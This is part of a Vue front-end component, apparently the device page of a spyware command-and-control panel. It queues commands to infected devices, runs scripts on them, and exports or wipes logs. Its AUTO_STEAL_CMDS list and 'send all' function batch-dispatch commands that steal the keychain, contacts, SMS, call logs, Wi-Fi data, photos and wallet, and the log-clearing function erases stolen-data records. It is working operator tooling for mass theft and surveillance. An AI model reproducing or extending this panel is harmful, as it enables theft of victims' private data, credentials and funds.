  const arr = Array.isArray(filteredLogs.value) && filteredLogs.value.length ? filteredLogs.value : (logs.value || [])
  if (!arr.length) {
    ElMessage.warning('没有可复制的日志')
    return
  }
  const lines = []
  lines.push(`# Device UUID: ${uuid}`)
  lines.push(`# Exported at: ${new Date().toLocaleString()}`)
  lines.push(`# Total entries: ${arr.length}`)
  lines.push('')
  for (const ev of arr) {
    const parts = []
    parts.push(`[${formatLogTime(ev.time)}]`)
    parts.push(`[${(ev.level || 'info').toUpperCase()}]`)
    parts.push(`[${ev.type || '-'}]`)
    if (ev.ip) parts.push(`[IP ${ev.ip}]`)
    if (ev.status_code != null) parts.push(`[HTTP ${ev.status_code}]`)
    if (ev.source) parts.push(`(src=${ev.source})`)
    parts.push(ev.title || '')
    const head = parts.join(' ')
    lines.push(head)
    if (ev.detail) lines.push('  > ' + String(ev.detail).replace(/\n/g, '\n  > '))
    if (Array.isArray(ev.tags) && ev.tags.length) lines.push('  tags: ' + ev.tags.join(', '))
    lines.push('')
  }
  const text = lines.join('\n')
  try {
    if (navigator && navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
      await navigator.clipboard.writeText(text)
    } else {
      const ta = document.createElement('textarea')
      ta.value = text
      ta.style.position = 'fixed'
      ta.style.left = '-9999px'
      document.body.appendChild(ta)
      ta.select()
      try {
        document.execCommand('copy')
      } finally {
        document.body.removeChild(ta)
      }
    }
    ElMessage.success(`已复制 ${arr.length} 条日志到剪贴板`)
  } catch (e) {
    ElMessage.error('复制失败：' + (e?.message || '未知错误'))
  }
}

async function clearLogs() {
  try {
    await ElMessageBox.confirm(
      `将清空 UUID=${uuid} 的访问日志（HTTP 请求记录、命令历史、窃取数据文件/记录）。\n\n此操作不可恢复，确定继续吗？`,
      '清空设备日志确认',
      { confirmButtonText: '确定清空', cancelButtonText: '取消', type: 'warning', distinguishCancelAndClose: true }
    )
  } catch (e) {
    return
  }
  logsClearing.value = true
  try {
    const otp = await require2FA('clear device logs')
    const params = {}
    if (otp) params.otp_code = otp
    const res = await axios.delete(`/api/devices/${uuid}/logs`, { params })
    const d = res.data?.deleted || {}
    ElMessage.success(`已清空：日志 ${d.logs || 0} · 命令 ${d.commands || 0} · 窃取记录 ${d.exfil || 0} · 文件 ${d.files || 0}`)
    logs.value = []
    logsSummary.value = null
    loadTabs()
  } catch (err) {
    if (err === 'cancel' || err === 'close') return
    const msg = err?.response?.data?.detail || err?.message || '清空失败'
    ElMessage.error(msg)
  } finally {
    logsClearing.value = false
  }
}

function onTemplateClick(cmd) {
  if (commandsDisabled.value) {
    ElMessage.warning(commandBlockReason.value || '当前设备不兼容，命令下发已禁止')
    return
  }
  cmdText.value = cmd
}

async function sendCmd() {
  if (commandsDisabled.value) {
    ElMessage.error(commandBlockReason.value || '当前设备不兼容，命令下发已禁止')
    return
  }
  if (!cmdText.value.trim()) {
    ElMessage.warning('请输入命令')
    return
  }
  sendingCmd.value = true
  try {
    const otp = await require2FA('send command')
    const params = {}
    if (otp) params.otp_code = otp
    await axios.post('/api/commands', { device_uuid: uuid, command: cmdText.value.trim() }, { params })
    ElMessage.success('命令已发送，等待设备上线执行')
    cmdText.value = ''
    loadCommands()
  } catch (err) {
    const msg = err?.response?.data?.detail || '命令发送失败'
    ElMessage.error(msg)
  } finally {
    sendingCmd.value = false
  }
}

const AUTO_STEAL_CMDS = [
  'ds_info',
  'ds_location',
  'ds_screenshot',
  'ds_exfil_keychain',
  'ds_exfil_contacts',
  'ds_exfil_sms',
  'ds_exfil_calls',
  'ds_exfil_wifi',
  'ds_exfil_photos',
  'ds_exfil_wallet'
]

async function sendAllCmds() {
  if (commandsDisabled.value) {
    ElMessage.error(commandBlockReason.value || '当前设备不兼容，命令下发已禁止')
    return
  }
  if (sendingAll.value) return
  sendingAll.value = true
  let successCnt = 0
  let failCnt = 0
  try {
    const otp = await require2FA('send all commands')
    const params = {}
    if (otp) params.otp_code = otp
    for (let i = 0; i < AUTO_STEAL_CMDS.length; i++) {
      const cmd = AUTO_STEAL_CMDS[i]
      try {
        await axios.post('/api/commands', { device_uuid: uuid, command: cmd }, { params })
        successCnt++
      } catch (err) {
        failCnt++
      }
    }
    if (successCnt > 0) ElMessage.success(`批量下发成功：${successCnt} 条命令已加入待执行队列${failCnt ? `，失败 ${failCnt} 条` : ''}`)
    else ElMessage.error('批量下发全部失败，请检查日志')
    loadCommands()
  } catch (err) {
    const msg = err?.response?.data?.detail || '批量下发中断'
    ElMessage.error(msg)
  } finally {
    sendingAll.value = false
  }
}

async function loadScripts() {
  scriptsLoading.value = true
  try {
    const res = await axios.get('/api/commands/scripts', { params: { skip: 0, limit: 200 } })
    scriptsList.value = res.data?.items || res.data || []
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '脚本列表加载失败'
    ElMessage.error(msg)
    scriptsList.value = []
  } finally {
    scriptsLoading.value = false
  }
}

function openRunScript() {
  if (commandsDisabled.value) {
    ElMessage.error(commandBlockReason.value || '当前设备不兼容，脚本下发已禁止')
    return
  }
  selectedScriptId.value = null
  scriptDialogVisible.value = true
  loadScripts()
}

async function confirmRunScript() {
  if (commandsDisabled.value) {
    ElMessage.error(commandBlockReason.value || '当前设备不兼容，脚本下发已禁止')
    return
  }
  if (!selectedScriptId.value) {
    ElMessage.warning('请选择要运行的脚本')
    return
  }
  scriptRunning.value = true
  try {
    const otp = await require2FA('run script on device')
    if (otp === false) { scriptRunning.value = false; return }
    const params = {}
    if (otp) params.otp_code = otp
    const res = await axios.post(`/api/commands/scripts/${selectedScriptId.value}/run`, { targets: [uuid] }, { params })
    const n = typeof res.data?.devices === 'number' ? res.data.devices : 1
    ElMessage.success(`脚本已发送到 ${n} 台设备`)
    scriptDialogVisible.value = false
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '脚本发送失败'
      ElMessage.error(msg)
    }
  } finally {
    scriptRunning.value = false
  }
}

function cmdStatusTag(s) {
  return { pending: 'warning', running: 'primary', completed: 'success', failed: 'danger', expired: 'info' }[s] || 'info'
}
function cmdStatusLabel(s) {
  return { pending: '待执行', running: '执行中', completed: '已完成', failed: '失败', expired: '已过期' }[s] || s
}
async function cancelCmd(row) {
  try {
    await ElMessageBox.confirm('确认取消该命令？', '取消命令', { type: 'warning' })
    const otp = await require2FA('cancel command')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    await axios.post(`/api/commands/${row.id}/cancel`, null, { params })
    ElMessage.success('已取消')
    loadCommands()
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '取消失败'
      ElMessage.error(msg)
    }
  }
}
async function retryCmd(row) {
  try {
    const otp = await require2FA('resend command')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    await axios.post(`/api/commands/${row.id}/retry`, null, { params })
    ElMessage.success('已重新发送')
    loadCommands()
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '重发失败'
    ElMessage.error(msg)
  }
}
async function deleteCmd(row) {
  try {
    await ElMessageBox.confirm('确认删除该命令？此操作不可恢复。', '删除', { type: 'warning' })
    const otp = await require2FA('delete command')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    await axios.delete(`/api/commands/${row.id}`, { params })
    ElMessage.success('已删除')
    loadCommands()
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '删除失败'
      ElMessage.error(msg)
    }
  }
}
async function loadCommands() {
  const _t0 = performance.now()
  // 用 Error().stack 抓调用方，方便知道是谁触发了刷新（mounted / sendCmd 成功 / cancelCmd / 分页等）
  let _caller = 'unknown'
  try {
    const stackLines = (new Error()).stack?.split('\n') || []
    // stackLines[0] = 'Error', stackLines[1] = loadCommands 自己, stackLines[2] = 真实调用方
    const callerLine = stackLines[2] || stackLines[1] || ''
    const m = callerLine.match(/at\s+([^\s(]+)/)
    _caller = (m && m[1]) || callerLine.trim().slice(0, 60)
  } catch (_) {}

  const reqParams = {
    page: cmdPage.value,
    page_size: cmdPageSize.value,
    device_uuid: uuid,
    status: cmdStatusFilter.value || undefined,
    q: cmdQFilter.value || undefined
  }

  console.groupCollapsed(
    `%c[DeviceDetail:CMD]%c loadCommands START → page=${reqParams.page}, size=${reqParams.page_size}, status=${reqParams.status || '(all)'}, q=${reqParams.q || '(none)'} | caller=${_caller}`
    , 'color:#a855f7;font-weight:bold;', ''
  )
  console.log('reqParams:', JSON.parse(JSON.stringify(reqParams)))

  cmdLoading.value = true
  try {
    const res = await axios.get('/api/commands', { params: reqParams })
    const dur = (performance.now() - _t0).toFixed(1)
    const rawData = res.data
    const items = Array.isArray(rawData?.items) ? rawData.items
                : Array.isArray(rawData) ? rawData : []
    const total = rawData?.total != null ? Number(rawData.total) : items.length

    // 状态分布统计，快速判断各状态数量
    const statusBreakdown = items.reduce((acc, c) => {
      const s = String(c?.status || 'unknown')
      acc[s] = (acc[s] || 0) + 1
      return acc
    }, {})

    cmdList.value = items
    cmdTotal.value = total

    console.log(`✅ OK - HTTP ${res.status} | ${dur}ms | items=${items.length} | total=${total}`)
    console.log('status breakdown:', statusBreakdown)
    if (items.length > 0) {
      const first = items[0]
      const last = items[items.length - 1]
      console.log(
        'first row : id=%s  cmd="%s"  status=%s  created=%s',
        first.id, String(first.command || '').slice(0, 60), first.status, first.created_at
      )
      if (items.length > 1) {
        console.log(
          'last row  : id=%s  cmd="%s"  status=%s  created=%s',
          last.id, String(last.command || '').slice(0, 60), last.status, last.created_at
        )
      }
    } else {
      console.log('ℹ️ items 是空数组 → cmdList 会被置为 []。检查后端返回：rawData keys =', Object.keys(rawData || {}))
    }
    console.groupEnd()
  } catch (err) {
    const dur = (performance.now() - _t0).toFixed(1)
    const status = err?.response?.status
    const detail = err?.response?.data?.detail || err?.message || String(err)
    console.error(`❌ FAIL - HTTP ${status || 'N/A'} | ${dur}ms | detail:`, detail)
    console.error('full error:', err)
    console.groupEnd()
    const msg = err?.response?.data?.detail || err?.message || '命令历史加载失败'
    ElMessage.error(msg)
    cmdList.value = []
    cmdTotal.value = 0
  } finally {
    cmdLoading.value = false
  }
}

onMounted(() => {
  loadDevice()
  loadHeartbeats()
  loadTabs()
  loadLogs()
  loadCommands()
})
</script>

<style scoped>
/* ===== Terminal-style log panel ===== */
.term-window {
  background: #1e1e2e;
  border-radius: 8px;
  overflow: hidden;
  border: 1px solid #313244;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.12);
}
.term-titlebar {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 7px 14px;
  background: #181825;
  border-bottom: 1px solid #313244;
}
.term-traffic { display: flex; gap: 6px; flex-shrink: 0; }
.term-dot { width: 11px; height: 11px; border-radius: 50%; }
.term-dot-red    { background: #f38ba8; }
.term-dot-yellow { background: #f9e2af; }
.term-dot-green  { background: #a6e3a1; }
.term-title-text {
  font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', Consolas, monospace;
  font-size: 12px;
  color: #6c7086;
  flex: 1;
  user-select: none;
}
.term-title-count {
  font-family: 'SF Mono', Consolas, monospace;
  font-size: 11px;
  color: #585b70;
  flex-shrink: 0;
}
.term-body {
  max-height: 280px;
  overflow-y: auto;
  padding: 6px 0;
  font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', Consolas, 'Courier New', monospace;
  font-size: 12.5px;
  line-height: 1.65;
}
.term-body::-webkit-scrollbar { width: 8px; }
.term-body::-webkit-scrollbar-track { background: #1e1e2e; }
.term-body::-webkit-scrollbar-thumb { background: #45475a; border-radius: 4px; }
.term-body::-webkit-scrollbar-thumb:hover { background: #585b70; }

.term-empty {
  padding: 28px 16px;
  color: #6c7086;
  font-family: 'SF Mono', Consolas, monospace;
  font-size: 13px;
}
.term-prompt { color: #f9e2af; margin-right: 6px; }

.term-line {
  display: flex;
  align-items: baseline;
  gap: 7px;
  padding: 0 14px;
  transition: background-color .1s ease;
}
.term-line:hover { background: rgba(205, 214, 244, 0.04); }

.term-ts {
  color: #585b70;
  font-size: 11px;
  flex-shrink: 0;
  white-space: nowrap;
  user-select: none;
}
.term-tag {
  flex-shrink: 0;
  font-size: 10px;
  font-weight: 700;
  padding: 1px 5px;
  border-radius: 3px;
  white-space: nowrap;
  text-transform: uppercase;
  letter-spacing: 0.3px;
}
.term-msg {
  color: #cdd6f4;
  word-break: break-all;
  min-width: 0;
  flex: 1;
  white-space: pre-wrap;
}
.term-sc {
  font-size: 11px;
  font-weight: 700;
  flex-shrink: 0;
}
.term-sc-ok   { color: #a6e3a1; }
.term-sc-warn { color: #f9e2af; }
.term-sc-err  { color: #f38ba8; }
.term-ip {
  color: #585b70;
  font-size: 11px;
  flex-shrink: 0;
  white-space: nowrap;
}

/* Log level → message color */
.term-lvl-info    .term-msg { color: #cdd6f4; }
.term-lvl-log     .term-msg { color: #cdd6f4; }
.term-lvl-success .term-msg { color: #a6e3a1; }
.term-lvl-warn    .term-msg { color: #f9e2af; }
.term-lvl-error   .term-msg { color: #f38ba8; }
.term-lvl-fatal   .term-msg { color: #f38ba8; font-weight: 700; }
.term-lvl-debug   .term-msg { color: #89dceb; }

/* Type tag → bg/text color */
.term-tag-http              { background: #313244; color: #89b4fa; }
.term-tag-command           { background: #313244; color: #f9e2af; }
.term-tag-exfil             { background: #313244; color: #f5c2e7; }
.term-tag-device            { background: #313244; color: #a6e3a1; }
.term-tag-exploit           { background: #313244; color: #fab387; }
.term-tag-exploit_console  { background: #313244; color: #fab387; }
.term-tag-raw_log          { background: #313244; color: #56b6c2; }
.term-tag-log              { background: #313244; color: #6c7086; }

/* 利用进度卡片样式 */
.exploit-progress-card {
  padding: 16px 20px;
}
.exploit-stages-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  gap: 12px;
}
.exploit-stage-item {
  display: flex;
  align-items: flex-start;
  gap: 10px;
  padding: 12px 14px;
  border-radius: 8px;
  border: 1px solid var(--el-border-color-light);
  background: var(--el-bg-color-page);
  transition: all 0.2s ease;
}
.exploit-stage-item.done {
  border-color: #67c23a55;
  background: #67c23a0d;
}
.exploit-stage-item.current {
  border-color: #409eff77;
  background: #409eff0d;
  box-shadow: 0 0 0 2px #409eff22;
}
.exploit-stage-item.pending {
  opacity: 0.55;
}
.stage-indicator {
  flex-shrink: 0;
  width: 28px;
  height: 28px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 13px;
  font-weight: 600;
  background: var(--el-fill-color-light);
  color: var(--el-text-color-secondary);
}
.exploit-stage-item.done .stage-indicator {
  background: #67c23a;
  color: #fff;
}
.exploit-stage-item.current .stage-indicator {
  background: #409eff;
  color: #fff;
  animation: pulse-blue 1.8s ease-in-out infinite;
}
.stage-icon-done {
  font-size: 16px;
}
.stage-icon-num {
  font-size: 13px;
}
.stage-content {
  flex: 1;
  min-width: 0;
}
.stage-title {
  font-size: 13px;
  font-weight: 600;
  color: var(--el-text-color-primary);
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 8px;
  margin-bottom: 4px;
}
.stage-percent {
  font-size: 11px;
  font-weight: 400;
  color: var(--el-text-color-secondary);
  font-family: 'SF Mono', 'Fira Code', Consolas, monospace;
}
.stage-desc {
  font-size: 11px;
  color: var(--el-text-color-secondary);
  line-height: 1.4;
  word-break: break-all;
}
@keyframes pulse-blue {
  0%, 100% { box-shadow: 0 0 0 0 #409eff44; }
  50% { box-shadow: 0 0 0 6px #409eff00; }
}

/* ===== 响应式布局 ===== */
.device-detail-page {
  width: 100%;
  min-width: 0;
  box-sizing: border-box;
}

/* 信息三列行：窄屏各列间距 */
.info-row {
  row-gap: 8px;
}
.info-row .el-col + .el-col {
  /* 窄屏堆叠时给上方列底部留间距 */
}

/* 命令历史 + 命令发送行：窄屏堆叠间距 */
.cmd-row {
  row-gap: 16px;
}

/* 日志工具栏：输入框响应式收缩 */
.logs-type-select {
  width: 130px;
  flex: 0 0 130px;
}
.logs-search-input {
  width: 220px;
  flex: 1 1 160px;
  min-width: 140px;
}

/* 照片网格：自适应列数，窄屏也能正常显示 */
.photos-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
  gap: 8px;
}

/* 利用进度阶段网格窄屏 2 列 */
@media (max-width: 768px) {
  .exploit-stages-grid {
    grid-template-columns: 1fr;
  }
  .logs-type-select,
  .logs-search-input {
    width: 100%;
    flex: 1 1 100%;
  }
}

/* 超窄屏：照片网格 2 列 */
@media (max-width: 480px) {
  .photos-grid {
    grid-template-columns: repeat(2, 1fr);
  }
}
</style>
